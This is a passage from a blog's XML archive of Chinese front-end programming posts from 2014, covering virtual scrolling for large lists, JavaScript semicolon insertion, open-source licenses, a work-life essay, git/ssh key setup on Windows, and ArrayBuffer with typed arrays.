），这个时候浏览器还来不及渲染，所以会出现临时的空白，这种体验是相当不好的。 二、Demodemo 在 IE 7、8 有 bug，请读者自己修复吧~ 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;title&gt;百万数据前端快速流畅显示&lt;/title&gt;&lt;style type="text/css"&gt;#box &#123;position: relative; height: 300px; width: 200px; border:1px solid #CCC; overflow: auto&#125;#box div &#123; position: absolute; height: 20px; width: 100%; left: 0; overflow: hidden; font: 16px/20px Courier;&#125;&lt;/style&gt;&lt;div id="box"&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;var total = 1e5 , len = total , height = 300 , delta = 20 , num = height / delta , data = [];for(var i = 0; i &lt; total; i++)&#123; data.push(&#123;content: "item-" + i&#125;);&#125;var box = document.getElementById("box");box.onscroll = function()&#123; var sTop = box.scrollTop||0 , first = parseInt(sTop / delta, 10) , start = Math.max(first - num, 0) , end = Math.min(first + num, len - 1) , i = 0; for(var s = start; s &lt;= end; s++)&#123; var child = box.children[s]; if(!box.contains(child) &amp;&amp; s != len - 1)&#123; insert(s); &#125; &#125; while(child = box.children[i++])&#123; var index = child.getAttribute("data-index"); if((index &gt; end || index &lt; start) &amp;&amp; index != len - 1)&#123; box.removeChild(child); &#125; &#125;&#125;;function insert(i)&#123; var div = document.createElement("div"); div.setAttribute("data-index", i); div.style.top = delta * i + "px"; div.appendChild(document.createTextNode(data[i].content)); box.appendChild(div);&#125;box.onscroll();insert(len - 1);&lt;/script&gt; 可以戳这个 demo，或者看这里 http://gist.github.com/barretlee/9744160 三、算法说明1. 计算 start 和 end 节点123456789 | |+=======|==============|========+——| ↓——+--------------+ | ↑| delta | | || ↑——+--------------+ | height| | | || +--------------+ | ↓+=======|==============|========+—— | | Container 可以容纳的 Data 数目为 num = height / delta，Container 顶部第一个节点的索引值为 1var first = parseInt(Container.scrollTop / delta); 由于我们上下都有留出一屏，所以 12var start = Math.max(first - num, 0);var end = Math.min(first + num, len - 1); 2. 插入节点通过上面的计算，从 start 到 end 将节点一次插入到 Container 中，并且将最后一个节点插入到 DOM 中。 12345678910// 插入最后一个节点insert(len - 1);// 插入从 start 到 end 之间的节点for(var s = start; s &lt;= end; s++)&#123; var child = Container.children[s]; // 如果 Container 中已经有该节点，或者该节点为最后一个节点则跳过 if(!Container.contains(child) &amp;&amp; s != len - 1)&#123; insert(s); &#125;&#125; 这里解释下为什么要插入最后一个节点，插入节点的方式是： 1234567function insert(i)&#123; var div = document.createElement("div"); div.setAttribute("data-index", i); div.style.top = delta * i + "px"; div.appendChild(document.createTextNode(data[i].content)); Container.appendChild(div);&#125; 可以看到我们给插入的节点都加了一个 top 属性，最后一个节点的 top 是最大的，只有把这个节点插入到 DOM 中，才能让滚动条拉长，让人感觉放了很多的数据。 3. 删除节点为了减少浏览器的重排（reflow），我们可以隐藏三屏之外的数据。我这里为了方便，直接给删除掉了，后续需要再重新插入。 1234567while(child = Container.children[i++])&#123; var index = child.getAttribute("data-index"); // 这里记得不要把最后一个节点给删除掉了 if((index &gt; end || index &lt; start) &amp;&amp; index != len - 1)&#123; Container.removeChild(child); &#125;&#125; 当 DOM 加载完毕之后，触发一次 Container.onscroll()，然后整个程序就 OK 了。 四、小结本文主要是叙述大数据加载的一点基本原理，程序可能有 bug，也有很多地方可以优化，了解下算法就行了。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[感想以及一些文章索引]]></title>
    <url>%2Fblog%2F2014%2F03%2F17%2F2014-03-17-cb-two-yeas%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 接触前端快三年了，记得是在大二的时候开始进博客园写博，三年的成长有两年得益于与各位前辈的交流和讨论。首先感谢博客园给我们提供了很好的交流平台，也祝博客园的建设越来越好！同时也感谢技术上擦过火花的小伙伴们，希望以后的日子里可以更多更深入的交流！一点学习经验以 Barret 这个名字混迹于不少 QQ 群中，时间比较久了，跟一些人也建立了比较好的友谊关系。在群里，不管是提问还是回答别人提出的问题，总能在未知领域找到属于自己的东西。现在还会经常在群里碰到学习前端的新人，他们有时提问抓不到关键词或者不知道如何形容自己的问题，这也让我看到了当初的自己，希望有经验的学习者可以包容这些人，耐心的回答他们提出的问题，因为我们也是这么成长起来的~这几年时间我看过很多书籍，每本书都是作者学习经验的浓缩，我很推荐大家买几本参考书籍，如《JavaScript权威指南》、《JavaScript设计模式》、《JavaScript异步编程》、《JavaScript高级程序设计》、《JavaScript语言精粹》、《CSS权威指南》等，这些书籍我都读过三五遍，有些则看过七八遍，所以对一些 JS 比较基础的东西都有所了解。我们在网上所有资料的时候，也推荐大家上权威一点的网站上去查询，如 MDN、 MSDN&nbsp;&nbsp;、whatwg、w3等，在这里我们可以找到最全面最深入的资料。对于问题的剖析一定要刨根问底，一直追溯到最底层的原理，比如 垃圾回收机制 追溯到 V8，websocket 追溯到 TCP 层等，把最底层的原理搞明白了，回答别人的问题才会有底气，不然人家几个为什么就会把你问的无话可说了。去年的六月份在百度实习了三个月，那时候的同事给我取了个外号，叫\小胡子哥“，我也比较喜欢这个 nickname，所以在博客顶上也加上了这个外号。现在我在淘宝UED实习，阿里有个传统就是给自己取花名，当时也没多想，天王被人注册了，所以给自己取了个名字，叫 \阎王“。所以大家也可以叫我阎王。文章罗列本来打算在入园两周年发点有技术含量的文章，结果，呵..呵，太忙了，就简单的罗列下自己写过的一点点东西。1. web语音通信让音乐响起来看得到的音频流音量的控制声道的转换声音的过滤这一系列的文章还没有写完，后续还有几篇，等有时间了整理下。包括如何使用 JavaScript 录音，还是音频的压缩和船速等等。2. 一些原理性的东西Javascript异步编程原理浅谈模块化加载的实现原理细说WebSocket - Node篇细说websocket - php篇进阶正则表达式你所不知道的JavaScript数组JavaScript之web通信JavaScript模板引擎原理对闭包机制的深入理解[解惑]JavaScript事件机制解读jQuery中extend函数因为喜欢去偏底层的思考，所以对一些经常遇到的东西做了稍微深层的分析。3. 介绍性的东西软件（代码）开源，协议声明让你的页面瞬间全屏JavaScript多文件下载再探@font-face及webIcon制作PJAX的实现与应用ECMAScript 6 简介SEO：让搜索引擎对你的网站更有亲和力(译)4. 偏应用的【屌丝之作】3D遥控坦克大战Javascript综合应用小案例字体大小自适应纯css解决方案那些年，我们一起玩过的响应式布局前端编码规范之JavaScript前端编码规范之CSS玩转正则之highlight高亮Javascript分号，加还是不加？git/ssh捋不清的几个问题从登录框看前端结语在学校，很多时间都是自己支配的，相当自由，工作之后一些事情就身不由己了，我希望自己记录的一点东西可以对新人有帮助，也希望可以通过这些文字记录自己学习的历程。谢谢大家的支持！&nbsp;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript分号，加还是不加？]]></title>
    <url>%2Fblog%2F2014%2F03%2F16%2F2014-03-16-cb-semicolon-retalk%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 关于这个问题，网上已经有很多人讨论过了，我先说说自己对这个问题的回答：加！（但非必须）有些人写代码，懒得加分号，除非是迫不得已才勉强放一个分号上去。如果你可以保证你写的代码不出现任何 bug，那当然是没有问题，但是很多 JSer 新人，对一些隐含的问题并不是特别清楚，很容易在不知不觉中写出一堆 bug，我们先来了解下 JS 词法语法解析的时候，哪些情况下会自动插入分号。一、自动插入分号的规则注：鼠标滑过文字可以看到翻译原文1. 程序从左到右解析，当纳入下一个 token 无法匹配任何语法：如该 token 跟之前的 token 之间有至少一个 LineTerminal 行终结符违反分割该 token 为 } 符号时2. 程序从左到右解析，当纳入下一个（或几个） token 不能产生一条合法的语句的时候，会在这个地方插入一个分号。 3. &lt;span class=”translator” title=”When, as the program is parsed from left to right, a token is encountered that is allowed by some production of the grammar, but the production is a restricted production and the token would be the first token for a terminal or nonterminal immediately following the annotation [no LineTerminator here]” within the restricted production (and therefore such a token is called a restricted token), and the restricted token is separated from the previous token by at least one LineTerminator, then a semicolon is automatically inserted before the restricted token.”&gt;程序从左到右解析，当纳入的 token 能够产生一条合法语句，但是这条语句是受限产生式时，在该受限 token 前面自动插入分号。上面提到的一些内容来自 ECMAScript5.1 第七章第九节，可以戳这里，翻译的不太通顺，实在是太难翻译了= =二、一些不加分号会出问题的场景场景一： 12s = a + b(x + y).doSomething() 我们期望这是这是两条语句，结果会被解析成： 1s = a + b(x + y).doSomething(); b 在这里成了一个函数了。场景二： 123x++y 这个 ++ 符号会给谁？答案是： 1x; ++y; 这样的代码当然是很少遇到，但是遇到这种情况：场景三： 12returntrue 我们期望返回 true，结果： 12return;true; 给我们返回了 undefined。场景四： 12s = function(x)&#123;return x&#125;(1 + 2).toString() 他被解析成了 1s = function(x)&#123;return x&#125;(1 + 2).toString() function(x){return x}(1 + 2) 这个作为一个整体，1+2 作为参数送入函数，该函数的返回值为 3，然后执行 3.toString()，这样的问题藏的比较深，不容易被发现。三、规避问题有些语句是以 [ 或者 ( 开头，就像上面提到的场景一和场景四，这些 token 很容易和上一条没有加分号的语句合并到一起，如果你不太喜欢加分号，可以这样来处理： 12s = function(x)&#123;return x&#125;;(1 + 2).toString() 这也是为什么我们会经常看到别人的代码中写出这样的函数： 123;(function()&#123; // ...&#125;)(); 在 function 的前面加了一个分号，目的就是为了防止整个函数的返回值作为参数送入上一条语句之中。对于场景三，要特别说明一下，除了 return 之外，还有 break 和 continue 语句，break 和 continue 类似 C 语言中的 goto ，他是可以在后面添加 tag 的，如果 tag 和 这些关键词之间存在 LineTerminal ，这些 tag 就会被忽略，如： 12breaktag 我们期望程序会调到 tag 所指向的程序段，但结果被解析成 12break;tag; 四、小结 看到上面的一些列问题，相信大家心里还是有自己的答案了，如果你有信心代码里头不出现因为不写分号而导致的错误，那分号的取舍其实是无所谓的。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件（代码）开源，协议声明]]></title>
    <url>%2Fblog%2F2014%2F03%2F14%2F2014-03-14-cb-open-source%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 注意：对于协议有个大概的了解就行了，本文叙述不是很标准，如果要做具体了解，请戳文中给出的链接。关于开源协议网上有很多说明，不过写的都十分晦涩，让人木有读下去的欲望，下面给大家简单的科普一下。一般很少人关注代码开源的协议说明，我们平时看到的 MIT Apache BSD 等，一堆英文的缩写，也懒得去看具体的内容，这说明你的维权意识还不是很强。辛辛苦苦写了一堆代码，贴到某个分享区，啪一下被人家复制走了，然后别人改个名字，捎带加个协议，说是自己写的，一般情况下这种事情的发生我们可以忽视之，当如果这串代码被人家作为商用，成为挣钱利器，那个时候你后悔也来不及了。目前市面上看到的协议种类还是挺繁多的，同一种协议可能还有几个版本，每个版本之间存在细微的差异，如何给自己的代码添加合适的协议？太宽松了，自己劳动成果容易被人家窃取；太苛刻了，人家也不想用你的东西。1. 如果你想使用一个简单不那么麻烦的协议，可以选择 MIT别人需要注意什么呢？署上你的大名，就可以带走你的代码了。你不用为他项目中因使用你的代码出现的问题承担任何责任。2. 如果你顾及到专利，可以选择 Apache可能代码中的某个技术或者创新点，你申请了专利，使用这个协议可以保护你专利的一些权力，简单点说就是让别人免费使用你这专利中的东西。3. 如果你很在意别人对你代码的修改，希望分享并得到促进，可以选择 GPLGPL 分为两个版本一个是 V2，一个是 V3，作品带上这个协议之后，别人想分享的话也得加上这个协议，对代码作出比较大的更改也是需要附带说明的。上面提到的几个是比较常见的，也提一下其他几个。LGPL 在GPL前面多了个 L，内容和 GPL 差不多，适合一些代码库或者框架使用。BSD 也有两个版本，类似 MITNo License 注意，这可不是没有版权声明，只是作者保留版权（包括分发，复制或者创造衍生物），只是你分享的时候允许分享平台附带的一些操作。如代码扔到 gitlab 上，就表示你允许别人查看并且 fork 你的代码。Public domain dedication 这玩意儿才是不保留版权，也就是版权自由（Copy Left），跟保留版权（Copy Right）是相对的。基本就是放弃对这段代码的任何权利，可以自由使用。他和不声明版权的区别就是，告诉别人，兄弟，我这代码是没版权的，你随便使用~如果还想具体了解其他相关的知识，请直接去http://choosealicense.com/，这里有最权威最全面的的说明。汉化版地址：http://choosealicense.gitcafe.com/]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工作，但别忘了生活]]></title>
    <url>%2Fblog%2F2014%2F03%2F12%2F2014-03-12-cb-work-in-life%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 已经一点多了[昨晚写的]，其实我现在挺累的，想去睡个觉，不过有些东西还是需要记录一下。人已经不在学校了，也不想谈太多学校里面的事情，社会和学校之间似乎有一层屏障，把很多东西都分隔开了。我挺喜欢学校，很自由，可以不慌不忙的支配时间。只是有些许内疚，大学没去好好支配时间。最近在看什么呢？《宏观经济学》、《心理学导论》、《税法》，当然也少不了一些技术书籍。这几天发生在我身边的事情让我感觉到，人特别渺小，尤其是缺乏知识的人，跟社会接轨的比较少，当走进社会之后就显得更渺小了。在学校，每个人都期望着找准自己的位置，寻找社会上适合自己的角色，一些人找到了，还有一些人，继续留在学校，他们或许找到了自己的定位，或许…只是等待更好的时机。我是一个工作起来会忘我的人，今天一个 git/ssh 的配置折腾到十点多，八点多的时候站起来看了下周边，已经没什么人了。我不喜欢加班，只是学习的时候忘记了时间。每次思考都会沉浸在自己的世界中，有时候还会哼起小曲儿。不知道这是不是程序员特有的风格。我不喜欢承认自己是程序员，我有很多爱好，也有能力将这些爱好变成我的专长，就像编程一样。现在很多上班族都是在外租房，不是自己的家所以也没有太多的归属感。在一个不是自己家的地方生活，会过的比较散漫，上班的唠叨容易带回住处，上班的情绪也会滞留在住处，慢慢地，工作占据了生活。做饭做菜就甭说了，一没时间，二没技术，三没心情。周末可能也就是窝在几米见方的小室内，过的很压抑，甚至有压力。我觉得现在在外面拼搏的人需要考虑下生活，怎么去生活！很多人做事总是匆匆忙忙的，但是结果呢，像样的东西啥也没做出来，成天说忙，结果不知道时间去哪儿了。整天在挣钱，结果也不知道钱去哪儿了。让节奏慢下来，不是让你一分钟敲十行代码改成敲一行。规划好下一步要做的事情，让自己有一个思考和停顿的时间。其实生活很简单，它就是吃完饭收拾下碗筷，就是停下脚步看看身边的人在做什么，就是学学做菜，就是出去走走…工作很重要，不过他只是我们生活的一部分，不要让工作占据你生活的一切！]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git/ssh捋不清的几个问题]]></title>
    <url>%2Fblog%2F2014%2F03%2F11%2F2014-03-11-cb-problems-in-git-when-ssh%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 主要是 windows 用户会遇到很多纠结的问题，linux/unix 用户属于这方面的高端用户，应该有能力处理此类问题，而且网络上也有很多解决方案，本文的授众是 windows 用户。由于今天配置了一下午，虽说配置过程基本搞清楚，懒得重新配置一遍，所以文中皆以文字形式叙述，没有截图。本文地址：http://www.cnblogs.com/hustskyking/p/problems-in-git-when-ssh.html，转载请注明源地址。一、概念的解释1. rsa 与 rsa.pub网上很容易搜到的东西我就不说了，我们知道，通过： 1ssh-keygen -t rsa -C &quot;something&quot; 可以生成两个文件，这两个文件的命名默认是 id_rsa 和 id_rsa.pub，如果你在键入上述命令回车之后，重新输入了命名，那此时生成的两个文件就是 [命名] 和 [命名].pub，这个好理解。主要是解释下生成了两个什么东西。id_rsa 可以称之为私有密钥，id_rsa.pub 可以称之为公有密钥。我们会把公有密钥交给服务端，当需要从服务端请求内容的时候，要带上私有密钥。此时，服务器会通过一定的算法计算私有密钥，并判断计算的结果是否与公有密钥一样，如果不一样则响应请求失败。 1234567+-----------+ +-----------+| | | || | enc(rsa) == rsa.pub | || client | ------------------------&gt; | server || | ? | || | | |+-----------+ +-----------+ rsa.pub 里面是个什么东西，其实很简单： 1ssh-rsa base64(加密内容) &quot;something&quot; 而 rsa 中是： 123-----BEGIN RSA PRIVATE KEY-----base64(私有密钥的一些处理)-----END RSA PRIVATE KEY----- 2. 验证程序 在使用 git 命令与服务端进行交互之前，我们可以先验证下服务器和客户端是否握手成功了。 1ssh -T git@xxx.com 如果是 github，就可以直接写 git@github.com, 如果是 aaa.bbb.com，就可以写 git@aaa.bbb.com。 如果成功，你会看到 success 之类的字眼。3. known_hosts 文件这是个什么文件呢？一般情况下 windows 下不会产生这个文件，先说说他是干什么的。当我们成功与服务端进行连接时，ssh 会记录服务端的 Host、IP 以及 rsa 文件，当连接过程中出现：Permanently added ‘10.0.0.0’ (RSA) to the list of known hosts.如果你选择 Yes，那这个 known_hosts 文件中就会多出一条记录。windows 是不会自动产生这个文件的，也可能是程序产生了，但是没权限写入，所以我们没有在 .ssh/ 目录下看到这个文件。但如果我们创建了这个文件，会发现里面的内容会随着我们的验证慢慢增加。搞清楚了这些概念，我们再说说会遇到的问题。二、常见问题1. git@xxx.com 输入密钥当你键入 ssh -T git@xxx.com 这条命令之后，程序提示要你输入 git@xxx.com 的密码，那不用想了，程序没找到你的私有密钥。在哪些情况下会这样呢？我们在生成这两个密钥的时候，程序可能没有帮我们在根目录下(C:/Users/yourName)新建一个 .ssh/ 文件夹，而他在建立连接的时候会默认寻找 ~/.ssh/id_rsa，如果没有新建一个这样的文件夹很显然是找不到的。你可以在根目录下通过命令行来新建一个文件夹 1mkdir .ssh 之所以要用命令行是因为有时候浏览器不让你在文件夹名第一位放点号。当然也有可能是因为你没有把创建的两个密钥放到 .ssh/ 目录下，而是直接扔在根目录下。2. Host key verification failed“Host key verification failed.” 相信你也撞到了这个问题，主机的密钥验证失败，主机就是你的机器，密钥验证失败有两个原因，一个是 RSA 做了更改，另一个原因是在 known_hosts 中存在一个缓存的记录，如果确认了 RSA 没有错误，那你就应该去 known_hosts 中删掉对应的那个记录（这个记录可以当做是缓存，是对验证做了一次缓存，缓存的作用是减少验证次数，不需要每次都验证，读取缓存就行了）。当然，你也可以直接删除这个 known_hosts 文件。3. Permission denied (publickey)“Permission denied (publickey).” 这个问题其实和上面的 2 差不多，当你出现过 “Host key verification failed.”，然后继续执行程序，如执行 ssh -T git@xxx.com 的时候就会出现这个问题提醒。说到底就是没有找到你的 rsa 私有密钥，或者 rsa 密钥匹配出错。三、windows 下让人纠结的问题1. 找不到根目录生成密钥默认放在 “~/.ssh/“ 下，但是在 cmd 下操作会找不到 “~/“ 这个根目录，因为这是 windows 不是 linux/unix，有些童鞋可能装了 cygwin，在这个环境下操作可以 “cd ~”，git bash 下当然也是可以的。如果不知道有这个问题的存在，你会碰到上述问题一，程序直接让你输入密码，但不过你输入什么密码都是错误的。输入三次之后状态为 Permission denied，这里的原因就是没找到 ~/.ssh/id_rsa ，cmd 下她根本就不认识 “~/“ 这个目录。2. 多个服务端的维护很常见的问题。上面我们说到了，程序会默认寻找 ~/.ssh/id_rsa 这个文件，同一目录下显然不能有两个重名文件，也就是说当我们去认证 github 和另外一个 git 服务器的时候，我们需要把两个 rsa 私有密钥的名字换来换去，想用谁就把谁改成 id_rsa。特别麻烦，那肿么办？之前在网上看到说是对 ssh_config 进行配置，配置内容是： 123456Host github.com User boy-a IdentifyFile ~/.ssh/githubHost xxx.com User boy-b IdentifyFile ~/.ssh/xxx 这里的 “~/.ssh/github” 和 “~/.ssh/xxx” 都是 rsa 文件，文件的命令可以直接改，也可以在开始生成的时候设定，命名对内容没有任何影响。项目的几行代码应该也是十分清晰的，针对不同的 git 服务器，使用不用的 IdentifyFile。但是你会发现，你的设置毫无用处，因为你把文件名搞错了！在 linux/unix 下可能是使用 ssh_config 这个文件名，但是在 windows 下是使用 config 作为文件名放在 ~/.ssh/ 目录中！四、小结这东西我纠结了一个下午，花了将近三个多小时才解决问题，真心快吐血了！说到底就是一个 config 的配置问题，遇到这种问题最快捷的方式并不是在网上疯狂的搜索答案，而是静下心来看看 rsa | git | ssh 的基础知识，了解每个参数及其用途，对症下药！ 补充： 1）\ssh-add -l” 报错 \Could not open a connection to your authentication agent.”&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 操作：ssh-agent bash -login -i 2）\Are you sure you want to continue connecting (yes/no)?” 选择 yes ，否则会报错\fatal: Could not read from remote repository.” 3） config 文件貌似没啥用，IdentifyFile path/to/rsa 这个地方报错。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你所不知道的JavaScript数组]]></title>
    <url>%2Fblog%2F2014%2F03%2F03%2F2014-03-03-cb-javascript-array%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 相信每一个 javascript 学习者，都会去了解 JS 的各种基本数据类型，数组就是数据的组合，这是一个很基本也十分简单的概念，他的内容没多少，学好它也不是件难事情。但是本文着重要介绍的并不是我们往常看到的 Array，而是 ArrayBuffer。我写的很多东西都是因为要完成某些特定的功能而刻意总结的，可以算是备忘，本文也是如此！前段时间一直在研究 Web Audio API 以及语音通信相关的知识，内容侧重于音频流在 AudioContext 各个节点之间的流动情况，而现在要摸清楚音频到流底是个什么样的数据格式，所以对 ArrayBuffer 的研究就显得格外重要了。本文地址：http://www.cnblogs.com/hustskyking/p/javascript-array.html，转载请注明源地址。一、Array 在内存中的堆栈模型1. Array 的获取Javascript 中如何产生 Array： 123[element0, element1, ..., elementN]new Array(element0, element1, ..., elementN)new Array(arrayLength) 直接定义，或者通过构造函数创建一个 Array，当然也可以使用其他的手段： 12&quot;array&quot;.split(&quot;&quot;);&quot;array&quot;.match(/a|r/g); 等等，方式有很多。但是 Array 内部是个什么样的结构，恐怕很多人还不是很清楚。2. 堆栈模型在数组中我们可以放很多不同数据类型的数据，如： 1var arr = [21, &quot;李靖&quot;, new Date(), function()&#123;&#125;, , null]; 上面这个数组中一次放入了 数字、字符串、对象、函数、undefined 和 null，对于上面的数据接口我们可以具象的描述下： 1234567891011121314 栈+---------+ 堆| 21 | +-------------------++---------+ | || &quot;李靖&quot; | | |+---------+ | +--------+ || [refer] |-----------&gt;| Object | |+---------+ | +--------+ || [refer] |-----------------&gt;+--------+ |+---------+ | |function| ||undefined| | +--------+ |+---------+ | || null | +-------------------++---------+ Created By Barret Lee JavaScript 的数据类型分为两种，一种是值类型，一种是引用类型，常见的引用类型有 Object 和 Array，数组的储存模型中，如果是诸如 Number、String 之类的值类型数据会被直接压入栈中，而引用类型只会压入对该值的一个索引，用 C 语言的概念来解释就是只保存了数据的指针，这些数据是储存在堆中的某块区间中。栈堆并不是独立的，栈也可以在堆中存放。好了，对 Array 的说明就到这里，下面具体说说 ArrayBuffer 的相关知识。二、ArrayBufferweb 是个啥玩意儿，web 要讨论的最基本问题是什么？我觉得有两点，一个是数据，一个是数据传输，至于数据的展示，纷繁复杂，这个应该是 web 上层的东西。而本文要讨论的 ArrayBuffer 就是最基础的数据类型，甚至不能称之为数据类型，它是一个数据容器，需要通过其他方式来读写。官方点的定义：The ArrayBuffer is a data type that is used to represent a generic, fixed-length binary data buffer. You can’t directly manipulate the contents of an ArrayBuffer; instead, you create an ArrayBufferView object which represents the buffer in a specific format, and use that to read and write the contents of the buffer.表示二进制数据的原始缓冲区，该缓冲区用于存储各种类型化数组的数据。 无法直接读取或写入 ArrayBuffer，但可根据需要将其传递到类型化数组或 DataView 对象 来解释原始缓冲区。他是一个二进制数据的原始缓冲区，虽然 JavaScript 是弱类型语言，但是他本身是对数据的类型和大小都有限制的，我们需要通过某种数据结构将缓冲区的内容有序的读取出来（写进去）。1. 原始缓冲区的创建通过 ArrayBuffer 这个构造函数可以创建一个原始缓冲区： 1var buffer = new ArrayBuffer(30); 从 chrome 控制台可以看到：buffer 实例拥有一个 byteLength 的属性，用于获取 buffer 的 size，一个只有 IE11+ 以及 ios6+ 支持的 slice 方法，用于对 buffer 长度进行截取操作。 1234ArrayBuffer slice( unsigned long begin unsigned long end Optional); 可以测试这个 DEMO： 12345678910var buffer = new ArrayBuffer(12);var x = new Int32Array(buffer);x[1] = 1234;var slice = buffer.slice(4);var y = new Int32Array(slice);console.log(x[1]);console.log(y[0]);x[1] = 6789;console.log(x[1]);console.log(y[0]); 2. 类型化数组 类型化数组类型表示可编制索引和操纵的 ArrayBuffer 对象 的各种视图。 所有数组类型的长度均固定。名称大小（以字节为单位）描述Int8Array18 位二补码有符号整数Uint8Array18 位无符号整数Int16Array216 位二补码有符号整数Uint16Array216 位无符号整数Int32Array432 位二补码有符号整数Uint32Array432 位无符号整数Float32Array432 位 IEEE 浮点数Float64Array864 位 IEEE 浮点数Int 就是整型，Uint 为无符号整形，Float 为浮点型，这些是 C 语言中的基本概念，我就不具体解释了。由于这些视图化结构都是大同小异，本文只对 Float32Array 类型作说明，读者可以举一反三。Float32Array 跟 Array 是十分类似的，只不过他每一个元素都是都是一个 32位（4字节） 的浮点型数据。Float32Array 一旦创建其大小不能再修改。我们可以直接创建一个 Float32Array: 12345var x = new Float32Array(2);x[0] = 17;console.log(x[0]); // 17console.log(x[1]); // 0console.log(x.length); // 2 需要有这么一个概念，他依然是一个数组，只不过该数组中的每个元素都是 Float 32 位的数据类型，再如： 1234var x = new Float32Array([17, -45.3]);console.log(x[0]); // 17console.log(x[1]); // -45.29999923706055console.log(x.length); // 2 我们把一个数组的值直接赋给了 x 这个 Float32Array 对象，那么在储存之前会将它转换成一个 32位浮点数。由于该类数组的每个元素都是同一类型，所以在堆栈模型中，他们全部会被压入到栈之中，因此类型化数组都是值类型，他并不是引用类型！这个要引起注意，从下面的例子中也可以反映出来： 1234567var x = new Float32Array([17, -45.3]);var y = new Float32Array(x);console.log(x[0]); // 17console.log(x[1]); //-45.29999923706055console.log(x.length); // 2x[0] = -2;console.log(y[0]); // 17, y的值没变 将 x 的值复制给 y，修改 x[0], y[0] 并没有变化。除了上面的方式，我们还可以通过其他方式来创建一个类型化数组： 12345var buffer = new ArrayBuffer(12);var x = new Float32Array(buffer, 0, 2);var y = new Float32Array(buffer, 4, 1);x[1] = 7;console.log(y[0]); // 7 解释下这里为什么返回 7. 123456789 ArrayBuffer（12）+-+-+-+-+-+-+-+-+-+-+-+-+-+|0|1|2|3|4|5|6|7|8| | | | |+-+-+-+-+-+-+-+-+-+-+-+-+-+\ / x (Float32Array) offset：0 byteLength：4 length:2 12345678 ArrayBuffer（12）+-+-+-+-+-+-+-+-+-+-+-+-+-+|0|1|2|3|4|5|6|7|8| | | | |+-+-+-+-+-+-+-+-+-+-+-+-+-+ \ / y Created By Barret Lee 看了上面的图解还有疑问么？我觉得我不用继续解释了。可以把 ArrayBuffer 的单位看成 1，而 Float32Array 的单位是 4.3. DataView对象DataView 对象对数据的操作更加细致，不过我觉得没啥意思，上面提到的各种类型化数组已经可以基本满足应用了，所以这里就一笔带过，一个简单的示例： 123456var buffer = new ArrayBuffer(12);var x = new DataView(buffer, 0);x.setInt8(0, 22);x.setFloat32(1, Math.PI);console.log(x.getInt8(0)); // 22console.log(x.getFloat32(1)); // 3.1415927410125732 如果感兴趣，可以移步http://www.javascripture.com/DataView，作详细了解。三、XHR2 中的 ArrayBufferArrayBuffer 的应用特别广泛，无论是 WebSocket、WebAudio 还是 Ajax等等，前端方面只要是处理大数据或者想提高数据处理性能，那一定是少不了 ArrayBuffer 。XHR2 并不是什么新东西，可能你用到了相关的特性，却不知这就是 XHR2 的内容。最主要的一个东西就是 xhr.responseType，他的作用是设置响应的数据格式，可选参数有：”text”、”arraybuffer”、”blob”或”document”。请注意，设置（或忽略）xhr.responseType = ‘’ 会默认将响应设为”text”。这里存在一个这样的对应关系： 12345请求 响应text DOMStringarraybuffer ArrayBufferblob Blobdocument Document 举个栗子： 12345678910var xhr = new XMLHttpRequest();xhr.open(&apos;GET&apos;, &apos;/path/to/image.png&apos;, true);xhr.responseType = &apos;arraybuffer&apos;;xhr.onload = function(e) &#123; // this.response == uInt8Array.buffer var uInt8Array = new Uint8Array(this.response);&#125;;xhr.send(); 我们在 xhr.responseType 中设置了属性为 arraybuffer，那么在拿到的数据中就可以用类型化数组来接受啦！ 四、小结 本文主要介绍了 Array 在堆栈模型中的存放方式，也详细描述了 ArrayBuffer 这个原始缓冲区的二进制数据类型，在 web 开发中，数据以及数据的储存是一个重要的部分，希望引起注意！ 本文叙述上可能存在错误，请多多斧正！ 五、参考资料 http://www.javascripture.com/ArrayBuffer//developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array MDN Arrayhttp://www.html5rocks.com/zh/tutorials/file/xhr2/ html5rockshttp://technet.microsoft.com/zh-cn/ie/br212485 MSDN]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让你的页面瞬间全屏]]></title>
    <url>%2Fblog%2F2014%2F03%2F01%2F2014-03-01-cb-javascript-fullscreen%2F</url>
